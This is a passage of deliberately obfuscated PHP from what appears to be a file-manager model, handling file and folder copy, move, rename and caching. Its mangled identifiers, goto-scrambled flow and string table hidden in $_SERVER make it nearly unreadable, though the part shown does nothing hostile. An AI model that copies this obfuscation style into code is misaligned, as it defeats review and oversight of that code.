$D‡¤Àèãõ, $D¡áŸÚ‹š¨); } else { $F¡ÈÓ‡•ä = $this->_childrenList($EôÄ¼˜·¤Ë); foreach ($F¡ÈÓ‡•ä as $Dö¶¥ÎÂâº) { $this->_copy($Dö¶¥ÎÂâº[$Eì¢ò°÷¸ô[394]], $f†è£‰íÛ, $FÍåÉ©«¼, $D¡áŸÚ‹š¨, !1); } } } else { if ($FÍåÉ©«¼ == REPEAT_RENAME || $FÍåÉ©«¼ == REPEAT_RENAME_FOLDER) { $D‡¤Àèãõ = $this->fileNameAutoCache($aß¡Ë…±¾ò, $D‡¤Àèãõ, $FÍåÉ©«¼, $AÉø¤·ğµÈ); $Eë¯‚ˆè“³ = $this->_copyCreate($EôÄ¼˜·¤Ë, $aß¡Ë…±¾ò, $D‡¤Àèãõ, $D¡áŸÚ‹š¨); } else { if ($FÍåÉ©«¼ == REPEAT_REPLACE) { $dâ°»Ä…ÉÂ = $this->sourceInfoCache($f†è£‰íÛ); $fŞò¤ëá¶Ó = $this->fileHistory($dâ°»Ä…ÉÂ, $eæ‘ÏŞ”Íâ[$Eì¢ò°÷¸ô[445]], $eæ‘ÏŞ”Íâ[$Eì¢ò°÷¸ô[78]]); if ($fŞò¤ëá¶Ó) { $D¡áŸÚ‹š¨[$Eì¢ò°÷¸ô[528]][] = $eæ‘ÏŞ”Íâ[$Eì¢ò°÷¸ô[445]]; } } else { if ($FÍåÉ©«¼ == REPEAT_SKIP) { } } } Hook::trigger($Eì¢ò°÷¸ô[533], array($Eì¢ò°÷¸ô[534], $eæ‘ÏŞ”Íâ, 0)); } goto aÂ»†¿Õƒ; dò¼ÓÚÆÀ: } private function _copyCreate($cïÕãÑŞº, $C¿‘‹Â³œ, $f“âÒæºø®, &$AØŒ Ğ¹‚) { goto BºùÇ‘‚¤Ü; CİŞ”ğ¤¦: foreach ($AæŒ‰È¢é as $a˜ÄŒáŞÇñ) { $dÒ…“É´ó = $a˜ÄŒáŞÇñ[$CìëßÉ¥[394]]; $EõÏ‹˜ºê© = $this->_childrenMatch($b‡Û†„Ø¹‰, $a˜ÄŒáŞÇñ, $cîõªó¨Î); $B“¸õ–Øã[] = array($CìëßÉ¥[394], $dÒ…“É´ó, $CìëßÉ¥[476], $EõÏ‹˜ºê©[$CìëßÉ¥[476]]); $CÙŠ‘„Ã÷Œ[] = array($CìëßÉ¥[394], $dÒ…“É´ó, $CìëßÉ¥[485], $EõÏ‹˜ºê©[$CìëßÉ¥[485]]); $this->_copyApplyMeta($a˜ÄŒáŞÇñ, $AØŒ Ğ¹‚); if ($a˜ÄŒáŞÇñ[$CìëßÉ¥[401]] != $CìëßÉ¥[87]) { $AØŒ Ğ¹‚[$CìëßÉ¥[528]][] = $a˜ÄŒáŞÇñ[$CìëßÉ¥[445]]; } } $this->chunkEventSet($CìëßÉ¥[540], array($CìëßÉ¥[541], $f³Œ†¿‚ã, $cŒ¼…›‰ë¤)); $this->saveAll($B“¸õ–Øã); goto eâªÌ¹²¢; Cˆš•ğ’Œ : if ($bó°‘Ëê§ƒ[$CìëßÉ¥[401]] != $CìëßÉ¥[87]) { $AØŒ Ğ¹‚[$CìëßÉ¥[528]][] = $bó°‘Ëê§ƒ[$CìëßÉ¥[445]]; return $Eé‚íŞ¶½; } $cï´ø‚¨ì‚ = array(); $B¾°°£¶‰ = array(); goto CÄä®Ç…Ñ; D¥óÁœãÅ»: $Eé‚íŞ¶½ = $this->add($f³Œ†¿‚ã); $B¢³ĞÓ…Ú = array($CìëßÉ¥[394] => $Eé‚íŞ¶½, $CìëßÉ¥[28] => $f“âÒæºø®); $this->_copyApplyMeta($B¢³ĞÓ…Ú, $AØŒ Ğ¹‚); goto Cˆš•ğ’Œ ; fƒ÷´ĞæÉ: $b‡Û†„Ø¹‰[$cïÕãÑŞº] = $Eé‚íŞ¶½; $B“¸õ–Øã = array(); $CÙŠ‘„Ã÷Œ = array(); goto CİŞ”ğ¤¦; CÄä®Ç…Ñ: $this->_childrenListAll($cïÕãÑŞº, $cï´ø‚¨ì‚); $cŒ¼…›‰ë¤ = count($cï´ø‚¨ì‚); if ($cŒ¼…›‰ë¤ == 0) { return $Eé‚íŞ¶½; } goto aå×£Ö‰Ï¤; aå×£Ö‰Ï¤: $cîõªó¨Î = $this->sourceInfo($Eé‚íŞ¶½); foreach ($cï´ø‚¨ì‚ as $a˜ÄŒáŞÇñ) { $cÓĞä‹Û­ = $this->_makeItemData($a˜ÄŒáŞÇñ, $cîõªó¨Î, $a˜ÄŒáŞÇñ[$CìëßÉ¥[28]]); $cÓĞä‹Û­[$CìëßÉ¥[485]] = $a˜ÄŒáŞÇñ[$CìëßÉ¥[485]]; $B¾°°£¶‰[] = $cÓĞä‹Û­; } $this->chunkEventSet($CìëßÉ¥[538], array($CìëßÉ¥[539], $f³Œ†¿‚ã, $cŒ¼…›‰ë¤)); goto cŒáùá¾‰; cŒáùá¾‰: $this->addAll($B¾°°£¶‰, array(), !1); $AæŒ‰È¢é = $this->where(array($CìëßÉ¥[476] => $Eé‚íŞ¶½))->select(); $b‡Û†„Ø¹‰ = $this->_childrenMakeRelation($cï´ø‚¨ì‚, $AæŒ‰È¢é); goto fƒ÷´ĞæÉ; d®ã¡Õêãª: $f³Œ†¿‚ã = $this->_makeItemData($bó°‘Ëê§ƒ, $cƒì­¯ÒŠŠ, $f“âÒæºø®); Hook::trigger($CìëßÉ¥[535], $f³Œ†¿‚ã); Hook::trigger($CìëßÉ¥[536], array($CìëßÉ¥[537], $f³Œ†¿‚ã, 0)); goto D¥óÁœãÅ»; BºùÇ‘‚¤Ü: $CìëßÉ¥ =& $_SERVER[Ç³Íß¦Ó]; $bó°‘Ëê§ƒ = $this->sourceInfoCache($cïÕãÑŞº); $cƒì­¯ÒŠŠ = $this->sourceInfoCache($C¿‘‹Â³œ); goto d®ã¡Õêãª; eâªÌ¹²¢: $this->chunkEventSet($CìëßÉ¥[542], array($CìëßÉ¥[543], $f³Œ†¿‚ã, $cŒ¼…›‰ë¤)); $this->saveAll($CÙŠ‘„Ã÷Œ); return $Eé‚íŞ¶½; goto e²…ÁÄìÄõ; e²…ÁÄìÄõ: } private function _childrenMakeRelation($e¦ßœÊâ¼ƒ, $f°¦ÜÖİÔ) { $CĞê‚àÈÇè =& $_SERVER[Ç³Íß¦Ó]; $aó„³İË¼§ = array(); $BØäŒÉÑ‘ = array(); foreach ($e¦ßœÊâ¼ƒ as $e¼ù±¥Õ’¢) { $eîšïè‰„ = $e¼ù±¥Õ’¢[$CĞê‚àÈÇè[28]] . $CĞê‚àÈÇè[8] . $e¼ù±¥Õ’¢[$CĞê‚àÈÇè[485]]; $aó„³İË¼§[$eîšïè‰„] = $e¼ù±¥Õ’¢[$CĞê‚àÈÇè[394]]; } foreach ($f°¦ÜÖİÔ as $e¼ù±¥Õ’¢) { $eîšïè‰„ = $e¼ù±¥Õ’¢[$CĞê‚àÈÇè[28]] . $CĞê‚àÈÇè[8] . $e¼ù±¥Õ’¢[$CĞê‚àÈÇè[485]]; $cä‰Éç¢Ğ¯ = $aó„³İË¼§[$eîšïè‰„]; $BØäŒÉÑ‘[$cä‰Éç¢Ğ¯] = $e¼ù±¥Õ’¢[$CĞê‚àÈÇè[394]]; } return $BØäŒÉÑ‘; } private function _childrenMatch($Fä¨ æ‘¿, $BŞßÎø‚, $E¶†‡–É§ï) { goto aÓÔªÏÑã; eß¿Å¨¼ç: foreach ($cç¦…øƒÆ‹ as $AÅ´“˜Ä) { if (isset($Fä¨ æ‘¿[$AÅ´“˜Ä])) { $B»ÅÆ¨Ë® .= $Fä¨ æ‘¿[$AÅ´“˜Ä] . $CŠç°Û×³Õ[544]; } } $B»ÅÆ¨Ë® = rtrim($B»ÅÆ¨Ë®, $CŠç°Û×³Õ[47]) . $CŠç°Û×³Õ[47]; $fğ÷Ç‰ïÃÁ = $this->parentLevelArray($B»ÅÆ¨Ë®); goto F±àÕ½÷; aÓÔªÏÑã: $CŠç°Û×³Õ =& $_SERVER[Ç³Íß¦Ó]; $B»ÅÆ¨Ë® = $E¶†‡–É§ï[$CŠç°Û×³Õ[485]]; $cç¦…øƒÆ‹ = $this->parentLevelArray($BŞßÎø‚[$CŠç°Û×³Õ[485]]); goto eß¿Å¨¼ç; F±àÕ½÷: $d¨¤—òìàĞ = $fğ÷Ç‰ïÃÁ[count($fğ÷Ç‰ïÃÁ) - 1]; return array($CŠç°Û×³Õ[476] => $d¨¤—òìàĞ, $CŠç°Û×³Õ[485] => $B»ÅÆ¨Ë®); goto B¯Ú¾­²¬; B¯Ú¾­²¬: } private function _makeItemData($fÍèç¼·´–, $b¥§»ëÍŠ, $aÌ÷¢è‚´) { $D‚ÍŞ³áÔ =& $_SERVER[Ç³Íß¦Ó]; $F‚İïÀÔ£ = array($D‚ÍŞ³áÔ[545] => $fÍèç¼·´–[$D‚ÍŞ³áÔ[401]], $D‚ÍŞ³áÔ[411] => $aÌ÷¢è‚´, $D‚ÍŞ³áÔ[546] => $fÍèç¼·´–[$D‚ÍŞ³áÔ[403]], $D‚ÍŞ³áÔ[446] => $fÍèç¼·´–[$D‚ÍŞ³áÔ[445]], $D‚ÍŞ³áÔ[547] => $fÍèç¼·´–[$D‚ÍŞ³áÔ[78]], $D‚ÍŞ³áÔ[548] => $b¥§»ëÍŠ[$D‚ÍŞ³áÔ[402]], $D‚ÍŞ³áÔ[549] => $b¥§»ëÍŠ[$D‚ÍŞ³áÔ[482]], $D‚ÍŞ³áÔ[550] => USER_ID, $D‚ÍŞ³áÔ[551] => USER_ID, $D‚ÍŞ³áÔ[393] => $b¥§»ëÍŠ[$D‚ÍŞ³áÔ[394]], $D‚ÍŞ³áÔ[552] => $b¥§»ëÍŠ[$D‚ÍŞ³áÔ[485]] . $b¥§»ëÍŠ[$D‚ÍŞ³áÔ[394]] . $D‚ÍŞ³áÔ[47], $D‚ÍŞ³áÔ[415] => $fÍèç¼·´–[$D‚ÍŞ³áÔ[84]], $D‚ÍŞ³áÔ[420] => 0, $D‚ÍŞ³áÔ[553] => $D‚ÍŞ³áÔ[33]); return $F‚İïÀÔ£; } private function _copyApplyMeta($fò§Š‘ŒŠ«, &$A…¸ç×á†Ç) { $CÅÂ…Ò½ãŠ =& $_SERVER[Ç³Íß¦Ó]; $cÑÁĞÔ—¦· = $fò§Š‘ŒŠ«[$CÅÂ…Ò½ãŠ[394]]; $dã°äÍ²á = $fò§Š‘ŒŠ«[$CÅÂ…Ò½ãŠ[28]]; if (!isset($fò§Š‘ŒŠ«[$CÅÂ…Ò½ãŠ[554]]) || !$fò§Š‘ŒŠ«[$CÅÂ…Ò½ãŠ[554]] || $fò§Š‘ŒŠ«[$CÅÂ…Ò½ãŠ[554]] == $CÅÂ…Ò½ãŠ[495]) { $A…¸ç×á†Ç[$CÅÂ…Ò½ãŠ[530]][] = array($CÅÂ…Ò½ãŠ[394], $cÑÁĞÔ—¦·, $CÅÂ…Ò½ãŠ[554], short_id($cÑÁĞÔ—¦·)); } if (Input::check($dã°äÍ²á, $CÅÂ…Ò½ãŠ[555])) { $A…¸ç×á†Ç[$CÅÂ…Ò½ãŠ[529]][] = array($CÅÂ…Ò½ãŠ[394] => $cÑÁĞÔ—¦·, $CÅÂ…Ò½ãŠ[93] => $CÅÂ…Ò½ãŠ[442], $CÅÂ…Ò½ãŠ[371] => str_replace($CÅÂ…Ò½ãŠ[50], $CÅÂ…Ò½ãŠ[33], Pinyin::encode($dã°äÍ²á))); $A…¸ç×á†Ç[$CÅÂ…Ò½ãŠ[529]][] = array($CÅÂ…Ò½ãŠ[394] => $cÑÁĞÔ—¦·, $CÅÂ…Ò½ãŠ[93] => $CÅÂ…Ò½ãŠ[441], $CÅÂ…Ò½ãŠ[371] => Pinyin::encode($dã°äÍ²á, $CÅÂ…Ò½ãŠ[556])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($B‰¢¸“Œ¿) { goto dÂ¥§ÈŠ¶ª; dÂ¥§ÈŠ¶ª: $DÇÔ×Ô“ =& $_SERVER[Ç³Íß¦Ó]; $dŒ¤ËàÈßÅ = $this->sourceInfo($B‰¢¸“Œ¿); $d»ŠÅ˜ó“Ã = $DÇÔ×Ô“[422]; goto e¡¤ÈÔ¶Æå; f‹¿ë‚ğ‡‰: $fùØ¾¥ = array_to_keyvalue($fùØ¾¥, $DÇÔ×Ô“[394]); foreach ($fùØ¾¥ as $b‘§ºæ±ŒÑ) { $bÍ‘Š¡ÈÉ = $b‘§ºæ±ŒÑ[$DÇÔ×Ô“[476]]; $B‰¢¸“Œ¿ = $b‘§ºæ±ŒÑ[$DÇÔ×Ô“[394]]; if (!isset($this->_childrenListCache[$B‰¢¸“Œ¿]) && $b‘§ºæ±ŒÑ[$DÇÔ×Ô“[401]] == $DÇÔ×Ô“[87]) { $this->_childrenListCache[$B‰¢¸“Œ¿] = array(); } if (!isset($this->_childrenListCache[$bÍ‘Š¡ÈÉ])) { $this->_childrenListCache[$bÍ‘Š¡ÈÉ] = array(); } $this->_childrenListCache[$bÍ‘Š¡ÈÉ][$B‰¢¸“Œ¿] = $b‘§ºæ±ŒÑ; $this->_childrenItemCache[$B‰¢¸“Œ¿] = $b‘§ºæ±ŒÑ; } goto aÔå¦ÖÃÜÀ; e¡¤ÈÔ¶Æå: $aññõèŠ¶ß = array($DÇÔ×Ô“[485] => array($DÇÔ×Ô“[511], $dŒ¤ËàÈßÅ[$DÇÔ×Ô“[485]] . $B‰¢¸“Œ¿ . $DÇÔ×Ô“[512]), $DÇÔ×Ô“[421] => $this->targetIsDelete); $fùØ¾¥ = $this->field($d»ŠÅ˜ó“Ã)->where($aññõèŠ¶ß)->select(); if (!$fùØ¾¥) { return; } goto f‹¿ë‚ğ‡‰; aÔå¦ÖÃÜÀ: } private function _childrenListAll($bæí“ˆ¬¸, &$EÑò—µ×•) { $a×£³©”†‘ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($this->_childrenListCache[$bæí“ˆ¬¸])) { return; } $e…Êò‘ãë” = $this->_childrenListCache[$bæí“ˆ¬¸]; foreach ($e…Êò‘ãë” as $AïÈ½°­ÎÅ => $C£¦İƒ¥) { $EÑò—µ×•[$AïÈ½°­ÎÅ] = $C£¦İƒ¥; if ($C£¦İƒ¥[$a×£³©”†‘[401]] == $a×£³©”†‘[87]) { $this->_childrenListAll($AïÈ½°­ÎÅ, $EÑò—µ×•); } } } private function sourceInfoCache($B¬ŸìôÂÒ¶) { if (isset($this->_childrenItemCache[$B¬ŸìôÂÒ¶])) { return $this->_childrenItemCache[$B¬ŸìôÂÒ¶]; } return $this->sourceInfo($B¬ŸìôÂÒ¶); } private function _childrenList($a•ñ®Ñ‡ÃÖ) { if (isset($this->_childrenListCache[$a•ñ®Ñ‡ÃÖ])) { return $this->_childrenListCache[$a•ñ®Ñ‡ÃÖ]; } return $this->_childrenListSelect($a•ñ®Ñ‡ÃÖ); } private function _childrenListSelect($d›äÍÏ¨ĞŠ) { goto b‹¬¤–İ‚›; C‡Ì¨¨Ò¯©: foreach ($EğÚ»³”í as $d›äÍÏ¨ĞŠ => $açÕâíÏ’Æ) { $this->_childrenItemCache[$d›äÍÏ¨ĞŠ] = $açÕâíÏ’Æ; } return $EğÚ»³”í; goto Aæ÷Ğã›¾‘; b‹¬¤–İ‚›: $D†âÑ° =& $_SERVER[Ç³Íß¦Ó]; $EÇ§‹…ÛÑÓ = array($D†âÑ°[476] => $d›äÍÏ¨ĞŠ, $D†âÑ°[421] => $this->targetIsDelete); $E«íĞ¸ĞÈ¹ = $this->where($EÇ§‹…ÛÑÓ)->select(); goto e‹©—’Ú†‹; e‹©—’Ú†‹: $E«íĞ¸ĞÈ¹ = $E«íĞ¸ĞÈ¹ ? $E«íĞ¸ĞÈ¹ : array(); $EğÚ»³”í = array_to_keyvalue($E«íĞ¸ĞÈ¹, $D†âÑ°[394]); $this->_childrenListCache[$d›äÍÏ¨ĞŠ] = $EğÚ»³”í; goto C‡Ì¨¨Ò¯©; Aæ÷Ğã›¾‘: } private function fileNameExistCache($F½¹Àà…Îµ, $Bù—ì…²–¥) { $A¨ì¬ÛÜõİ =& $_SERVER[Ç³Íß¦Ó]; $Bù—ì…²–¥ = strtolower($Bù—ì…²–¥); $f¥Ù¶œ™éº = $this->_childrenList($F½¹Àà…Îµ); foreach ($f¥Ù¶œ™éº as $B„å…òâĞÈ) { if ($Bù—ì…²–¥ == strtolower($B„å…òâĞÈ[$A¨ì¬ÛÜõİ[28]])) { return $B„å…òâĞÈ[$A¨ì¬ÛÜõİ[394]]; } } return !1; } private function fileNameAutoCache($c–Ìê»ö–‘, $FÔ ôèæß‰, $fÌà¯À¶Ÿä, $d¦ùƒòÚˆ¿) { $F‡Ğ±èğ§º =& $_SERVER[Ç³Íß¦Ó]; $c•ƒª•÷Í = $this->_childrenList($c–Ìê»ö–‘); $b½·ë‘‹ë = array_to_keyvalue($c•ƒª•÷Í, $F‡Ğ±èğ§º[33], $F‡Ğ±èğ§º[28]); return $this->fileNameAutoGet($b½·ë‘‹ë, $FÔ ôèæß‰, $fÌà¯À¶Ÿä, $d¦ùƒòÚˆ¿); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($bÇôĞ¤«•, $Cî•ŞÇŸ¹, $CŠÒ„¨± = REPEAT_REPLACE, $B”‰ÕÑˆó = '') { goto aÈÍ‘Ïî¥Æ; aÈÍ‘Ïî¥Æ: $BÀÄ»ä¨›Û =& $_SERVER[Ç³Íß¦Ó]; $b©á Ë‹• = $this->sourceInfo($bÇôĞ¤«•); $a«Âøáâš = $this->sourceInfo($Cî•ŞÇŸ¹); goto EÙÛñéÊ™—; EÙÛñéÊ™—: if ($b©á Ë‹•[$BÀÄ»ä¨›Û[476]] == $a«Âøáâš[$BÀÄ»ä¨›Û[394]]) { if ($b©á Ë‹•[$BÀÄ»ä¨›Û[421]] == $BÀÄ»ä¨›Û[87]) { Model($BÀÄ»ä¨›Û[419])->restore(array($bÇôĞ¤«•)); } if (!$B”‰ÕÑˆó || $B”‰ÕÑˆó == $b©á Ë‹•[$BÀÄ»ä¨›Û[28]]) { return $bÇôĞ¤«•; } } $dÁÔÑíëÌ = $this->pathInfoMore($bÇôĞ¤«•); if ($this->isParentOf($bÇôĞ¤«•, $Cî•ŞÇŸ¹)) { return !1; } goto f¬˜óÔŞ”ù; f¬˜óÔŞ”ù: if (!$b©á Ë‹• || !$a«Âøáâš || $a«Âøáâš[$BÀÄ»ä¨›Û[401]] != $BÀÄ»ä¨›Û[87]) { return !1; } Hook::trigger($BÀÄ»ä¨›Û[557], $dÁÔÑíëÌ); $this->targetIsDelete = intval($b©á Ë‹•[$BÀÄ»ä¨›Û[421]]); goto E†Ê¢¯°Ú«; Bœ‘¡Å¤£Ö: $this->lockWriteStart($Cî•ŞÇŸ¹, $FÃ”­¼‹Ûî); $B»Ì‰ÜÁÆ = array($BÀÄ»ä¨›Û[528] => array(), $BÀÄ»ä¨›Û[559] => !1); $this->clearShare($bÇôĞ¤«•, $Cî•ŞÇŸ¹); goto f¢áç‚Œ«Œ; FèÙˆóï‡Ø: $this->lockMoveEnd($bÇôĞ¤«•); $this->lockWriteEnd($Cî•ŞÇŸ¹, $FÃ”­¼‹Ûî); $this->folderSizeReset($b©á Ë‹•[$BÀÄ»ä¨›Û[476]]); goto c†ë¸Óèµ; c…Ø¶ªğ²: if ($b©á Ë‹•[$BÀÄ»ä¨›Û[401]] == $BÀÄ»ä¨›Û[87] && $Aß ñí¢­Õ) { $this->folderSizeResetChildren($cæ‰Ãíæãå); } Model($BÀÄ»ä¨›Û[192])->linkAdd($B»Ì‰ÜÁÆ[$BÀÄ»ä¨›Û[528]]); if ($Aß ñí¢­Õ && $B»Ì‰ÜÁÆ[$BÀÄ»ä¨›Û[559]]) { $this->removeNow($bÇôĞ¤«•, !1); } goto FèÙˆóï‡Ø; EÏŸÊ§ƒ·Ü: $this->updateModifyTime($BÕ“îÏõÍ‰); Model($BÀÄ»ä¨›Û[532])->eventMove($bÇôĞ¤«•, $b©á Ë‹•[$BÀÄ»ä¨›Û[476]], $Cî•ŞÇŸ¹); Hook::trigger($BÀÄ»ä¨›Û[558], $dÁÔÑíëÌ); goto CÊ‘à±Ğàä; E†Ê¢¯°Ú«: if ($b©á Ë‹•[$BÀÄ»ä¨›Û[476]] == $Cî•ŞÇŸ¹ && $B”‰ÕÑˆó != $b©á Ë‹•[$BÀÄ»ä¨›Û[28]]) { $CÔåí²Êóò = $this->fileNameExist($Cî•ŞÇŸ¹, $B”‰ÕÑˆó); if ($CÔåí²Êóò && $b©á Ë‹•[$BÀÄ»ä¨›Û[401]] == $BÀÄ»ä¨›Û[495]) { goto A–†Òë³ø; A–†Òë³ø: $eôŠâÂ³² = $this->sourceInfo($CÔåí²Êóò); $e ÂÀá±ß = $this->fileHistory($eôŠâÂ³², $b©á Ë‹•[$BÀÄ»ä¨›Û[445]], $b©á Ë‹•[$BÀÄ»ä¨›Û[78]]); if (!$e ÂÀá±ß) { Model($BÀÄ»ä¨›Û[448])->remove($b©á Ë‹•[$BÀÄ»ä¨›Û[445]]); } goto D‰šÆµ†êß; bğ¹ªÚ­Œ: return $CÔåí²Êóò; goto E°ö¥ãä¤‘; D‰šÆµ†êß: $this->removeNow($bÇôĞ¤«•, !1); $this->folderSizeReset($Cî•ŞÇŸ¹); Hook::trigger($BÀÄ»ä¨›Û[558], $dÁÔÑíëÌ); goto bğ¹ªÚ­Œ; E°ö¥ãä¤‘: } } $FÃ”­¼‹Ûî = $B”‰ÕÑˆó ? $B”‰ÕÑˆó : $b©á Ë‹•[$BÀÄ»ä¨›Û[28]]; $this->lockMoveStart($bÇôĞ¤«•); goto Bœ‘¡Å¤£Ö; f¢áç‚Œ«Œ: $Aß ñí¢­Õ = $this->fileNameExistCache($Cî•ŞÇŸ¹, $b©á Ë‹•[$BÀÄ»ä¨›Û[28]]); $cæ‰Ãíæãå = $this->_move($bÇôĞ¤«•, $Cî•ŞÇŸ¹, $CŠÒ„¨±, $B»Ì‰ÜÁÆ, $B”‰ÕÑˆó); $this->sourceCacheClear(); goto c…Ø¶ªğ²; c†ë¸Óèµ: $this->folderSizeReset($Cî•ŞÇŸ¹); $BÕ“îÏõÍ‰ = array($b©á Ë‹•[$BÀÄ»ä¨›Û[476]], $Cî•ŞÇŸ¹); if ($b©á Ë‹•[$BÀÄ»ä¨›Û[401]] == $BÀÄ»ä¨›Û[87]) { $BÕ“îÏõÍ‰[] = $bÇôĞ¤«•; } goto EÏŸÊ§ƒ·Ü; CÊ‘à±Ğàä: return $cæ‰Ãíæãå; goto FŞÆŠÓİ˜; FŞÆŠÓİ˜: } private function _move($BªÈó»å²í, $Aº¨ÚË×æí, $Cİê‹™á, &$fè°³ƒßËâ, $FŒÍ½æ‰Ü = '') { goto BáË›ÖæÍ¿; c¨—‘ÕÑÒÑ: $c÷„­Ìóà = !1; if ($eË»î‚³šŒ) { if ($Cİê‹™á == REPEAT_RENAME_FOLDER) { $b®£‚½—ñ = $this->fileNameAuto($Aº¨ÚË×æí, $b®£‚½—ñ, $Cİê‹™á, $eË»î‚³šŒ); $E½˜Ò„«èó = $this->_moveForce($BªÈó»å²í, $Aº¨ÚË×æí, $b®£‚½—ñ); } else { if ($Cİê‹™á == REPEAT_RENAME_FOLDER) { $Cİê‹™á = REPEAT_RENAME; } $e·†Œ¿¡‹ = $this->_childrenListSelect($BªÈó»å²í); foreach ($e·†Œ¿¡‹ as $bÓå†£éƒì) { $this->_move($bÓå†£éƒì[$cåëç¢‹à[394]], $A›‚ã†Îä, $Cİê‹™á, $fè°³ƒßËâ); } $c÷„­Ìóà = !0; } } else { if ($Cİê‹™á == REPEAT_SKIP) { $c÷„­Ìóà = !0; } else { if ($Cİê‹™á == REPEAT_RENAME || $Cİê‹™á == REPEAT_RENAME_FOLDER) { $b®£‚½—ñ = $this->fileNameAuto($Aº¨ÚË×æí, $b®£‚½—ñ, $Cİê‹™á, $eË»î‚³šŒ); $E½˜Ò„«èó = $this->_moveForce($BªÈó»å²í, $Aº¨ÚË×æí, $b®£‚½—ñ); } else { if ($Cİê‹™á == REPEAT_REPLACE) { $DøÚ„»áßË = $this->sourceInfoCache($A›‚ã†Îä); $BÙ‘í’´´Ò = $this->fileHistory($DøÚ„»áßË, $D£ù«—À½[$cåëç¢‹à[445]], $D£ù«—À½[$cåëç¢‹à[78]]); if ($BÙ‘í’´´Ò) { $fè°³ƒßËâ[$cåëç¢‹à[528]][] = $D£ù«—À½[$cåëç¢‹à[445]]; } else { $c÷„­Ìóà = !0; } } } } } if ($c÷„­Ìóà && !$fè°³ƒßËâ[$cåëç¢‹à[559]]) { $fè°³ƒßËâ[$cåëç¢‹à[559]] = !0; } goto dòÓ¸ººõ‰; E„ïæğ â¥: $b®£‚½—ñ = $FŒÍ½æ‰Ü ? $FŒÍ½æ‰Ü : $D£ù«—À½[$cåëç¢‹à[28]]; $A›‚ã†Îä = $this->fileNameExistCache($Aº¨ÚË×æí, $b®£‚½—ñ); $this->lockMoveStart($BªÈó»å²í); goto fê³Â”Ó¯Ú; fê³Â”Ó¯Ú: $this->lockWriteStart($Aº¨ÚË×æí, $b®£‚½—ñ); if (!$A›‚ã†Îä) { return $this->_moveForce($BªÈó»å²í, $Aº¨ÚË×æí, $b®£‚½—ñ); } $E½˜Ò„«èó = $A›‚ã†Îä; goto c¨—‘ÕÑÒÑ; dòÓ¸ººõ‰: return $E½˜Ò„«èó; goto CäòëºÔ¯¹; BáË›ÖæÍ¿: $cåëç¢‹à =& $_SERVER[Ç³Íß¦Ó]; $D£ù«—À½ = $this->sourceInfo($BªÈó»å²í); $eË»î‚³šŒ = $D£ù«—À½[$cåëç¢‹à[401]] == $cåëç¢‹à[87]; goto E„ïæğ â¥; CäòëºÔ¯¹: } private function _moveForce($f«‘„”Ä–Ë, $còáöÓÂñ’, $B‰ñóµ‘ìø) { goto AŒŠÃÚÏŠ—; C÷šÅƒê§š: $C´éÊ’šà = $e·†œª„Æ¡[$Dï¾‚‚Òáî[401]] == $Dï¾‚‚Òáî[87]; $DˆÌÉßß×… = array($Dï¾‚‚Òáî[393] => $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[394]], $Dï¾‚‚Òáî[552] => $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[485]] . $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[394]] . $Dï¾‚‚Òáî[47], $Dï¾‚‚Òáî[548] => $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[402]], $Dï¾‚‚Òáî[549] => $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[482]], $Dï¾‚‚Òáî[551] => USER_ID, $Dï¾‚‚Òáî[411] => $B‰ñóµ‘ìø); $fŸÖè±°½ = $e·†œª„Æ¡[$Dï¾‚‚Òáî[402]] == SourceModel::TYPE_GROUP && $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[402]] == SourceModel::TYPE_GROUP && $e·†œª„Æ¡[$Dï¾‚‚Òáî[482]] == $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[482]]; goto aÀÔ—£ˆ; aÀÔ—£ˆ: if (!$fŸÖè±°½ && $this->moveClearAuth) { Model($Dï¾‚‚Òáî[480])->authClear($f«‘„”Ä–Ë); } $b¼ÏÂ·›ÀŸ = $e·†œª„Æ¡[$Dï¾‚‚Òáî[421]] == $Dï¾‚‚Òáî[87] && $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[421]] != $Dï¾‚‚Òáî[87]; if ($b¼ÏÂ·›ÀŸ) { $DˆÌÉßß×…[$Dï¾‚‚Òáî[420]] = 0; } goto a™ŸÔ³°âÇ; AŒŠÃÚÏŠ—: $Dï¾‚‚Òáî =& $_SERVER[Ç³Íß¦Ó]; $e·†œª„Æ¡ = $this->sourceInfo($f«‘„”Ä–Ë); $Aˆ­×—Š¨Å = $this->sourceInfo($còáöÓÂñ’); goto C÷šÅƒê§š; a™ŸÔ³°âÇ: if ($C´éÊ’šà) { $EÀ¡ƒÎŠ›¾ = array($Dï¾‚‚Òáî[552] => array($Dï¾‚‚Òáî[511], $e·†œª„Æ¡[$Dï¾‚‚Òáî[485]] . $e·†œª„Æ¡[$Dï¾‚‚Òáî[394]] . $Dï¾‚‚Òáî[512])); $f¤¿¹„­® = $e·†œª„Æ¡[$Dï¾‚‚Òáî[485]] . $e·†œª„Æ¡[$Dï¾‚‚Òáî[394]] . $Dï¾‚‚Òáî[47]; $C˜ïË„ì£µ = $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[485]] . $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[394]] . $Dï¾‚‚Òáî[47] . $e·†œª„Æ¡[$Dï¾‚‚Òáî[394]] . $Dï¾‚‚Òáî[47]; $eÆ¼Ñ³íŒÜ = array($Dï¾‚‚Òáî[552] => array($Dï¾‚‚Òáî[560], "\x72\145\x70\154\x61\143\x65\x28\160\x61\162\x65\156\164\x4c\x65\x76\x65\x6c\x2c\47{$f¤¿¹„­®}\47\x2c\x27{$C˜ïË„ì£µ}\47\x29"), $Dï¾‚‚Òáî[548] => $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[402]], $Dï¾‚‚Òáî[549] => $Aˆ­×—Š¨Å[$Dï¾‚‚Òáî[482]]); if ($b¼ÏÂ·›ÀŸ) { $eÆ¼Ñ³íŒÜ[$Dï¾‚‚Òáî[420]] = 0; } $this->where($EÀ¡ƒÎŠ›¾)->data($eÆ¼Ñ³íŒÜ)->save(); } $this->where(array($Dï¾‚‚Òáî[408] => 